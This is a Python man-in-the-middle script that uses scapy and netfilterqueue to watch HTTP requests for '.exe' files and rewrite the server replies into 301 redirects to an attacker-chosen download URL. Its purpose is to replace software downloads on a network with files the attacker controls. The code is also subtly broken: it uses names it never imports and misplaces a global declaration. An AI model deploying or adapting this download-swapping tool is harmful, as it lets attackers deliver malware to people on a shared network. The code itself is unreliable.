from scapy.all import IP
from mitm_helper_func import set_load
import argparse
import re
import netfilterqueue

def process_pkt(pkt):
	scapy_pkt = IP(pkt.get_payload())
	if scapy_pkt.haslayer(Raw):
		if scapy_pkt[TCP].dport == 10000:
			if ".exe" in scapy_pkt[Raw].load and re.search(r"://(\d*.\d*.\d*.\d*)/", download_file_url).group(0) not in scapy_pkt[Raw].load:
				print("Exe Request")
				ack_list.append(scapy_pkt[TCP].ack)
		elif scapy_pkt[TCP].sport == 10000:
			if scapy_pkt[TCP].seq in ack_list:
				ack_list.remove(scapy_pkt[TCP].seq)
				print("[+] Replacing File")
				new_load = "HTTP/1.1 301 Moved Permanently\nLocation: " + download_file_url + "\n\n"
				replaced_scapy_pkt = set_load(scapy_pkt, new_load)

				pkt.set_payload(str(replaced_scapy_pkt))
	pkt.accept()

def nfqueue_bind():
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, process_pkt)
	queue.run()

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-f', '--file', help='Url of the download File')
	args = parser.parse_args()
	download_file_url = args.file

	global ack_list
	global download_file_url
	ack_list = []

	nfqueue_bind()

if __name__ == '__main__':
	main()
